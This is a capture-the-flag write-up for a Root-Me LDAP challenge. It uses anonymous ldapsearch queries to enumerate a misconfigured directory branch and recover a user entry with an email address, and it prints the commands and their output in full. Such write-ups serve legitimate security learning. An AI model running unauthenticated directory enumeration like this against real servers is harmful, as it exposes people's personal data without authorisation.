# Description 
```
The administrator needs you, it seems that one of the anonymous users has installed themselves in a new branch of the LDAP directory; somewhere in:
dc=challenge01,dc=root-me,dc=org
Find access to their data and bring back their email address.

Challenge connection parameters
Host: challenge01.root-me.org
Protocol: LDAP
Port: 54013
```
# Exploit
- As a first step, I perform a null bind on the base DN to check what is accessible anonymously:
```
ldapsearch -x -H ldap://challenge01.root-me.org:54013 \
    -b "dc=challenge01,dc=root-me,dc=org" "(objectClass=*)" 
# extended LDIF
#
# LDAPv3
# base <dc=challenge01,dc=root-me,dc=org> with scope subtree
# filter: (objectClass=*)
# requesting: ALL
#

# search result
search: 2
result: 50 Insufficient access

# numResponses: 1

```
- The base DNs provided by Root-Me are present, but we don’t have access to them. However, the administrator told us that one of the anonymous users is located in one of these branches, so:
```
ldapsearch -x -H ldap://challenge01.root-me.org:54013 \
    -b "ou=anonymous,dc=challenge01,dc=root-me,dc=org" "(objectClass=*)" 
# extended LDIF
#
# LDAPv3
# base <ou=anonymous,dc=challenge01,dc=root-me,dc=org> with scope subtree
# filter: (objectClass=*)
# requesting: ALL
#

# anonymous, challenge01.root-me.org
dn: ou=anonymous,dc=challenge01,dc=root-me,dc=org
objectClass: organizationalUnit
ou: anonymous

# sabu, anonymous, challenge01.root-me.org
dn: uid=sabu,ou=anonymous,dc=challenge01,dc=root-me,dc=org
objectClass: inetOrgPerson
objectClass: shadowAccount
uid: sabu
sn: sabu
cn: sabu
givenName: sabu
mail: sabu@anonops.org

# search result
search: 2
result: 0 Success

# numResponses: 3
# numEntries: 2
```
